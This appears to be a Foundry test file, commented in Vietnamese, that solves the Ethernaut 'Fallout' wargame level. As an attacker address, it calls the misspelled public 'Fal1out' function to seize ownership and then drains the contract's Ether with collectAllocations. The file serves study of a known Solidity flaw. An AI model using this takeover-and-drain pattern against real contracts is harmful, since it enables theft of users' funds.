// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/Fallout.sol"; // Đường dẫn đến file code của bạn

contract FalloutTest is Test {
    Fallout public fallout;
    address public attacker = address(0x1337);

    function setUp() public {
        fallout = new Fallout();
        // Giả sử có một số Ether trong contract ban đầu
        vm.deal(address(fallout), 10 ether);
    }

    function testExploit() public {
        // Bắt đầu đóng vai người tấn công
        vm.startPrank(attacker);

        // Bước 1: Gọi hàm viết sai tên để chiếm quyền Owner
        // Chúng ta không gọi constructor, chúng ta gọi một hàm public bình thường
        fallout.Fal1out{value: 0.1 ether}();

        // Kiểm tra xem đã là owner chưa
        assertEq(fallout.owner(), attacker);
        console.log("Da chiem quyen Owner thanh cong!");

        // Bước 2: Rút sạch tiền
        uint256 balanceBefore = attacker.balance;
        fallout.collectAllocations();

        // Kiểm tra xem tiền đã về ví chưa
        assertEq(address(fallout).balance, 0);
        assertTrue(attacker.balance > balanceBefore);
        console.log("Da rut sach tien khoi contract!");

        vm.stopPrank();
    }
}
